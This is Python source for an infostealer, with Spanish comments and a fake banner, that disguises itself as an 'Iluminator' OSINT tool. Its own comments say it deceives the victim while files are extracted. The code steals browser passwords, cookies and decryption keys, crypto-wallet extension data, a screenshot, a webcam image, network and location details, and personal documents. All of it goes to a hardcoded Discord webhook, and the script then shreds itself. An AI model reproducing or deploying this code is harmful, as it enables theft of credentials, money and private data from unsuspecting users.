#__________________________________________________________
#                                                          |
# Codigo creado por t.me/Valen_Qq (uknowuser_qq) tg y dc   |
#__________________________________________________________|
#
# El codigo cuenta con engaño para hacer esperar al usuario mientras se extraen los archivos simulando una Herramienta de OSINT
# Este archivo se ejecutara en la PC del usuario a atacar

import requests
import os
import platform
import socket
import subprocess
import glob
import uuid
import pyautogui
import cv2
import time
import threading
import sys
import json
import base64
import sqlite3
import shutil
from datetime import datetime
from colorama import Fore, Style, init


init(autoreset=True)


WEBHOOK_URL = "https://discordapp.com/api/webhooks/1469545046855651409/BsbFkF4NXinUawqYhGsQw6iI9_gr7iDVnf4Jy2bUPRNXcZTqxl4CVgcWcgBT_XdOQdba"


BANNER_ILUMINATOR = r"""
██╗██╗      ██╗   ██╗███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗       ██████╗ ███████╗██╗███╗   ██╗████████╗
██║██║      ██║   ██║████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗     ██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║██║      ██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝     ██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║██║      ██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗     ██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║███████╗ ╚██████╔ ██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║     ╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝╚══════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝      ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
"""

BANNER_DDOS = r"""

Error contraseña incorrecta


"""


def obtener_mac():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    return mac.upper()

def enviar_archivo(ruta, mensaje=None):
    if os.path.exists(ruta):
        try:
            with open(ruta, 'rb') as f:
                requests.post(WEBHOOK_URL, data={"content": mensaje} if mensaje else None, files={"file": f})
        except: pass

def Stealer():
    ruta_u = os.path.expanduser("~")
    import shutil
    import sqlite3

    requests.post(WEBHOOK_URL, json={"content": "🚀 **Arrancando...**"})

    if platform.system() == "Windows":
        carpetas = {
            "Chrome": os.path.join(ruta_u, "AppData/Local/Google/Chrome/User Data"),
            "Brave": os.path.join(ruta_u, "AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            "Edge": os.path.join(ruta_u, "AppData/Local/Microsoft/Edge/User Data")
        }
    else:
        carpetas = {
            "Chrome": os.path.join(ruta_u, ".config/google-chrome"),
            "Brave": os.path.join(ruta_u, ".config/BraveSoftware/Brave-Browser"),
            "Chromium": os.path.join(ruta_u, ".config/chromium")
        }

    ids_wallets = {
        "Metamask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Phantom": "bfnaoagmgoenfnocnefjndmInstallation",
        "TrustWallet": "egjidjbpgmcnihkmyhgnehaidieebghe"
    }

    for nombre, path_base in carpetas.items():
        if not os.path.exists(path_base):
            continue

        requests.post(WEBHOOK_URL, json={"content": f"🌐 **{nombre}**"})

        llave = None
        archivo_ls = os.path.join(path_base, "Local State")
        if os.path.exists(archivo_ls):
            if platform.system() == "Windows":
                llave = obtener_llave_windows(archivo_ls) 
            
            t_ls = os.path.join(ruta_u, f"ls_{nombre}")
            try:
                shutil.copy2(archivo_ls, t_ls)
                enviar_archivo(t_ls, f"Key {nombre}")
                os.remove(t_ls)
            except: pass

        perfiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
        for perf in perfiles:
            p_actual = os.path.join(path_base, perf)
            if not os.path.exists(p_actual):
                continue

            archivo_logins = os.path.join(p_actual, "Login Data")
            if os.path.exists(archivo_logins):
                t_log = os.path.join(ruta_u, f"log_{nombre}_{perf}")
                try:
                    shutil.copy2(archivo_logins, t_log)
                    base_datos = sqlite3.connect(t_log)
                    cursor = base_datos.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    final = f"🔑 **{nombre} ({perf})**\n"
                    for fila in cursor.fetchall():
                        if fila[1]:
                            pass_limpia = descifrar_dato(fila[2], llave) if llave else "[Cifrado]"
                            final += f"📧 `{fila[1]}` : 🔑 `{pass_limpia}` | 🔗 {fila[0]}\n"
                    
                    if len(final) > 50:
                        requests.post(WEBHOOK_URL, json={"content": final[:1990]})
                    
                    base_datos.close()
                    os.remove(t_log)
                except: pass

            archivo_cookies = os.path.join(p_actual, "Network", "Cookies")
            if not os.path.exists(archivo_cookies):
                archivo_cookies = os.path.join(p_actual, "Cookies")

            if os.path.exists(archivo_cookies):
                t_cook = os.path.join(ruta_u, f"cook_{nombre}_{perf}.db")
                try:
                    shutil.copy2(archivo_cookies, t_cook)
                    enviar_archivo(t_cook, f"Cookies {nombre} {perf}")
                    os.remove(t_cook)
                except: pass

            exts = os.path.join(p_actual, "Local Extension Settings")
            if os.path.exists(exts):
                for w_nom, w_id in ids_wallets.items():
                    p_wallet = os.path.join(exts, w_id)
                    if os.path.exists(p_wallet):
                        try:
                            nom_zip = f"w_{nombre}_{perf}_{w_nom}"
                            shutil.make_archive(nom_zip, 'zip', p_wallet)
                            enviar_archivo(f"{nom_zip}.zip", f"Wallet {w_nom}")
                            os.remove(f"{nom_zip}.zip")
                        except: pass

    requests.post(WEBHOOK_URL, json={"content": "Listo."})

def Stealer2():
    try:
        Stealer()
        time.sleep(2)
    except: pass

    try:
        pyautogui.screenshot("s.png")
        enviar_archivo("s.png")
        os.remove("s.png")
        time.sleep(3)
    except: pass

    try:
        cap = cv2.VideoCapture(0)
        time.sleep(1)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("c.jpg", frame)
            cap.release()
            enviar_archivo("c.jpg")
            os.remove("c.jpg")
            time.sleep(3)
    except: pass

    try:

        p = os.path.abspath(sys.argv[0])
        if os.path.exists(p):

            with open(p, "wb") as f:
                f.write(os.urandom(os.path.getsize(p)))

            os.remove(p)
    except: pass


    try:
        data = requests.get("https://ipinfo.io/json").json()
        ip, loc, ciudad = data.get("ip", "N/A"), data.get("loc", "N/A"), data.get("city", "N/A")
    except: ip = loc = ciudad = "Error"

    wifi_name = "N/A"
    if platform.system() == "Windows":
        try:
            wifi_out = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode('utf-8', errors='ignore')
            for line in wifi_out.split("\n"):
                if "SSID" in line and "BSSID" not in line:
                    wifi_name = line.split(":")[1].strip()
                    break
        except: pass

    info = {
        "user": os.getlogin() if platform.system() != 'Windows' else os.environ.get('USERNAME'),
        "pc": socket.gethostname(),
        "ip": ip,
        "mac": obtener_mac(),
        "wifi": wifi_name,
        "ciudad": ciudad,
        "loc": loc,
        "os": platform.platform()
    }


    embed_payload = {
        "embeds": [{
            "title": "🔍 Vz Doxer Reporte ",
            "color": 0x00FF00, 
            "fields": [
                {"name": "👤 Usuario", "value": f"```{info['user']}```", "inline": True},
                {"name": "💻 Nombre PC", "value": f"```{info['pc']}```", "inline": True},
                {"name": "🌐 IP Pública", "value": f"[{info['ip']}](https://ipinfo.io/{info['ip']})", "inline": True},
                {"name": "🆔 Dirección MAC", "value": f"```{info['mac']}```", "inline": True},
                {"name": "📡 Red WiFi", "value": f"```{info['wifi']}```", "inline": True},
                {"name": "📍 Ubicación", "value": f"{info['ciudad']} ([Google Maps](https://www.google.com/maps?q={info['loc']}))", "inline": True},
                {"name": "🖥️ Sistema Operativo", "value": f"```{info['os']}```", "inline": False}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=embed_payload)


    keywords = ["DNI", "Contraseña", "CONTRASEÑA", "Usuarios", "SQL", "Password", "Cuentas", "Claves", "Login", "Wallet"]
    exts = [".txt", ".pdf", ".docx", ".jpg", ".png", ".sql", ".sqlite", ".db", ".kdbx"]
    rutas = [os.path.join(os.path.expanduser("~"), d) for d in ["Desktop", "Escritorio", "Documents", "Documentos", "Downloads", "Descargas"]]

    enviados = 0
    for r in rutas:
        if not os.path.exists(r): continue
        for root, dirs, files in os.walk(r):
            for file in files:
                if any(k in file for k in keywords) or any(file.endswith(e) for e in exts):
                    try:
                        path = os.path.join(root, file)
                        if 0 < os.path.getsize(path) < 8 * 1024 * 1024:
                            with open(path, 'rb') as f:
                                requests.post(WEBHOOK_URL, files={"file": f})
                            enviados += 1
                        if enviados >= 15: break
                    except: continue
            if enviados >= 15: break


def interfaz():

    os.system('cls' if os.name == 'nt' else 'clear')
    

    print(Fore.LIGHTGREEN_EX + BANNER_ILUMINATOR)
    print(Fore.LIGHTGREEN_EX + "\n> 20 Opciones de OSINT")
    print(Fore.GREEN + "> Iluminator osint creado por Iluminator_tools\n")


    sys.stdout.write(Fore.LIGHTGREEN_EX + "[+] Porfavor espere")
    for _ in range(5):
        for char in [".", ".", "."]:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.5)

        sys.stdout.write("\b\b\b   \b\b\b")
    
    sys.stdout.write("... OK\n\n")

    try:
        key = input(Fore.LIGHTGREEN_EX + "[*] Espere un poco mas porfavor (instalando librerias) Esto podria llevar de Uno a Dos minutos no cierre la terminal para que todo cargue correctamente")
        
        if key == "1234":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.LIGHTGREEN_EX + BANNER_DDOS)
            print("\n" + Fore.RED + "[!] Contactate con iluminator_tools para obtener una licencia")

            while True:
                time.sleep(10)
        else:
            print(Fore.RED + "Licencia incorrecta. Cerrando...")
            time.sleep(2)
    except:
        pass

if __name__ == "__main__":

    hilo_robo = threading.Thread(target=Stealer2)
    hilo_robo.start()


    interfaz()
    

    hilo_robo.join()
